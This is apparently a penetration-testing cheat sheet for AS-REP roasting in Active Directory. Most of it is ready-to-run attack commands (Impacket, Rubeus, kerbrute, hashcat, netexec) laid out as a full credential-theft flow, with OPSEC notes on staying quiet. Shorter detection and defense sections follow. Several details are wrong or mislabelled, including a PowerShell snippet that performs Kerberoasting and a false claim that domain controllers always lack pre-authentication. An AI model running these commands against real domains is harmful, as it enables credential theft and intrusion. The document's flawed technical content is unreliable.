# AS-REP Roasting

Exploit accounts with **Kerberos pre-authentication disabled** (`DONT_REQUIRE_PREAUTH`). The AS-REP response contains an encrypted timestamp that can be cracked offline.

## How It Works

```
User ──► AS-REQ (no pre-auth timestamp) ──► KDC
KDC  ──► AS-REP (TGT encrypted with user hash) ──► Attacker
Attacker cracks user hash offline
```

## Prerequisites

- Domain user list (valid usernames)
- Network connectivity to a Domain Controller (TCP/88)
- No credentials required

## Linux — GetNPUsers.py (Impacket)

### Single user by username
```bash
GetNPUsers.py 'domain.local/' -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.10
```

### With credentials (request for other users)
```bash
GetNPUsers.py 'domain.local/user:Password123!' -request -dc-ip 10.10.10.10
```

### From a known user list
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -format hashcat -dc-ip 10.10.10.10
```

### Quiet mode (less verbose)
```bash
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -format hashcat -dc-ip 10.10.10.10 -outputfile asrep.txt -debug
```

## Windows — Rubeus

### Enumerate and roast all AS-REP roastable users
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### With specific credentials
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /domain:domain.local /dc:10.10.10.10
```

### With user filter
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /user:targetuser
```

## Windows — Manual PowerShell

```powershell
# Request TGT without pre-authentication
[System.Reflection.Assembly]::LoadWithPartialName("System.IdentityModel")
$id = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "username@domain.local"
```

## Hashcat Cracking

```bash
# AS-REP hash (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# With rules
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r best64.rule -r d3ad0ne.rule -O

# Show cracked hashes
hashcat -m 18200 asrep_hashes.txt --show
```

### Hash Format
```
$krb5asrep$23$user@domain.local:<hash>
```

## Full Attack Flow

```
1. Enumerate domain with Kerbrute / user enumeration
   kerbrute userenum -d domain.local --dc 10.10.10.10 usernames.txt

2. AS-REP roast discovered users
   GetNPUsers.py domain.local/ -usersfile valid_users.txt -format hashcat -dc-ip 10.10.10.10 -outputfile asrep.txt

3. Crack what you get
   hashcat -m 18200 asrep.txt rockyou.txt

4. Use cracked credentials for further enumeration
   netexec smb 10.10.10.10 -u 'roastableuser' -p 'crackedpass'
```

## Detection & Signatures

**Windows Event Logs:**
- **Event ID 4768** — Kerberos TGT requested; look for `Pre-authentication type: 0`
- **Event ID 516** (DS Access) — Audit for user account attribute changes removing pre-auth

**Network Signatures:**
- AS-REQ without PA-ENC-TIMESTAMP (pre-auth data)
- Multiple AS-REQ from the same source to different users (roasting)
- AS-REP size larger than normal (contains crackable hash)

**Sigma Rules:**
```yaml
title: AS-REP Roasting
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
  condition: selection
```

## OPSEC Considerations

- **Low noise** — AS-REP requests are legitimate Kerberos traffic
- **No credentials needed** — Completely unauthenticated
- **False positives** — Domain controllers will always have pre-auth disabled
- **Limited impact** — Not all environments have roastable users (most secure orgs enforce pre-auth)
- **Combine with LDAP anonymous** — `ldapsearch` to find `userAccountControl: 4194304`

## Defenses

- **Enable pre-authentication** for all user accounts (Powershell: `Set-ADAccountControl -DoesNotRequirePreAuth $false`)
- **Monitor** Event ID 4768 with PreAuthType=0
- **Use long/complex passwords** for accounts that require pre-auth disabled (service accounts)
- **Discovery**: `Get-ADUser -Properties DoesNotRequirePreAuth | Where { $_.DoesNotRequirePreAuth }`

## References

- Impacket: https://github.com/fortra/impacket
- Rubeus: https://github.com/GhostPack/Rubeus
- hashcat: https://hashcat.net/hashcat/
- Cobalt Strike blog: ASREP Roasting
